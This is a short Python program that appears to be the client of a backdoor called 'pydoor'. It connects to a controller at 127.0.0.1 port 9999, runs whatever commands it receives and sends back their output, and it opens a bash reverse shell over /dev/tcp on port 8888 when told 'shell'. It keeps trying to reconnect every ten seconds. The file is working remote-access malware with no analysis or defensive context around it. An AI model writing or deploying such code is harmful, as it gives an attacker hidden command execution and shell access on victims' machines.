#!/usr/bin/env python

import socket
import time
import subprocess
import os
import sys

BUFFER = 4096


class Client:
    def __init__(self):
        self.sock = 0
        self.cmd = 0
    def processcmd(self):

        if self.cmd:
            print(self.cmd)

            if self.cmd == "shell":
                subprocess.run("bash -i >& /dev/tcp/127.0.0.1/8888 0>&1", shell=True)
            elif self.cmd == "quit":
                self.sock.send(b"pydoor.quit")
                sys.exit(0)
            elif self.cmd == "sleep":
                self.sock.send(b"pydoor.quit")
                time.sleep(1) #Temporary solution
                self.sock.close()
                self.start()
            
            else:
                j = subprocess.getoutput(self.cmd)
                self.sock.send(j.encode())

    def start(self):
        
        print("Starting client" )

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:

            try:
                
                self.sock.connect(("127.0.0.1", 9999))
                print("Connected to server")
                self.sock.send(b"Hey")
                while True:
                    self.cmd = self.sock.recv(BUFFER).decode()
                    
                    self.processcmd()
            except SystemExit:
                
                self.sock.send(b"pydoor.quit")
                sys.exit(0)
            except KeyboardInterrupt:
                sys.exit(0)

            except:
                pass
            time.sleep(10) #This is to avoid high cpu usage when the client is running without any server to hear 
                

if __name__ == "__main__":
    c = Client()

    c.start()